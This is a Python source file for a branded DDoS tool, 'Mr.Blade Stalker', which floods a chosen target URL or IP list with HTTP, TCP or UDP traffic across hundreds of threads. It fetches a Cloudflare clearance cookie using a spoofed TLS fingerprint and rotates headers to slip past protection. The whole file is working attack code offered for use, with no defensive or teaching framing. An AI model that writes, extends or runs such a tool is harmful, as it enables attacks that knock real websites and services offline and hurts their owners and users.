import argparse
import requests
import random
import threading
import ssl
import socket
import os
import time
import json
from tls_client import Session  # TLS Fingerprint Evasion
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Figlet-style Banner
def print_banner():
    banner = """
██████╗ ██╗      █████╗ ██████╗ ███████╗    ███████╗████████╗ █████╗ ██╗     ██╗  ██╗███████╗██████╗ 
██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██║     ██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ███████║██████╔╝███████╗    ███████╗   ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
██╔═══╝ ██║     ██╔══██║██╔═══╝ ╚════██║    ╚════██║   ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║██║     ███████║    ███████║   ██║   ██║  ██║███████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                          Code by @mrbladestalker | Telegram: @mrbladestalker0093
"""
    print(f"\033[91m{banner}\033[0m")

# Parse Command-line Arguments
parser = argparse.ArgumentParser(description="Mr.Blade Stalker DDoS Tool")
parser.add_argument("-u", "--url", help="Target website URL", required=True)
parser.add_argument("-p", "--proxy", help="Proxy file path (optional)", default=None)
parser.add_argument("-i", "--iplist", help="IP list file (optional)", default=None)
parser.add_argument("-t", "--type", choices=["http", "tcp", "udp"], help="Flood Type: http/tcp/udp", required=True)
parser.add_argument("-th", "--threads", type=int, help="Number of threads (default: 500)", default=500)
args = parser.parse_args()

# Load Proxies from File
PROXY_LIST = []
if args.proxy:
    try:
        with open(args.proxy, "r") as f:
            PROXY_LIST = [line.strip() for line in f.readlines()]
        print(f"\033[92m[✔] Loaded {len(PROXY_LIST)} Proxies from {args.proxy}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Proxy File Error: {e}\033[0m")

# Load Target IPs from File
TARGET_IPS = []
if args.iplist:
    try:
        with open(args.iplist, "r") as f:
            TARGET_IPS = [line.strip() for line in f.readlines()]
        print(f"\033[92m[✔] Loaded {len(TARGET_IPS)} Target IPs from {args.iplist}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] IP List File Error: {e}\033[0m")

# User-Agent & Referers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
]
REFERERS = ["https://google.com", "https://bing.com", "https://yahoo.com"]

# Cloudflare Bypass - Cookie Extraction
def get_cloudflare_cookies():
    try:
        session = Session(client_identifier="chrome_120")
        response = session.get(args.url)
        cookies = session.cookies.get_dict()
        if "cf_clearance" in cookies:
            print(f"\033[92m[✔] Cloudflare Bypassed | Clearance Cookie: {cookies['cf_clearance']}\033[0m")
        return cookies
    except Exception as e:
        print(f"\033[91m[!] Cloudflare Bypass Error: {e}\033[0m")
        return {}

# HTTP Flood Attack
def http_flood():
    cf_cookies = get_cloudflare_cookies()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Cache-Control": "no-cache",
            }
            response = requests.get(args.url, headers=headers, cookies=cf_cookies, timeout=5)
            print(f"\033[92m[✔] HTTP Flood -> Status: {response.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] HTTP Flood Error: {e}\033[0m")

# TCP Flood Attack
def tcp_flood():
    while True:
        try:
            target_ip = random.choice(TARGET_IPS) if TARGET_IPS else args.url
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 443))
            payload = os.urandom(1024)
            s.send(payload)
            print(f"\033[92m[✔] TCP Flood -> Sent {len(payload)} bytes to {target_ip}:443\033[0m")
            s.close()
        except Exception as e:
            print(f"\033[91m[!] TCP Flood Error: {e}\033[0m")

# UDP Flood Attack
def udp_flood():
    while True:
        try:
            target_ip = random.choice(TARGET_IPS) if TARGET_IPS else args.url
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(1024)
            s.sendto(payload, (target_ip, 443))
            print(f"\033[92m[✔] UDP Flood -> Sent {len(payload)} bytes to {target_ip}:443\033[0m")
        except Exception as e:
            print(f"\033[91m[!] UDP Flood Error: {e}\033[0m")

# Multi-threaded Execution
def start_attack():
    print_banner()
    print(f"\033[91m[!] Launching Mr.Blade Stalker Attack on {args.url} with {args.threads} threads...\033[0m")

    if args.type == "http":
        for _ in range(args.threads):
            threading.Thread(target=http_flood).start()
    elif args.type == "tcp":
        for _ in range(args.threads):
            threading.Thread(target=tcp_flood).start()
    elif args.type == "udp":
        for _ in range(args.threads):
            threading.Thread(target=udp_flood).start()

if __name__ == "__main__":
    start_attack()
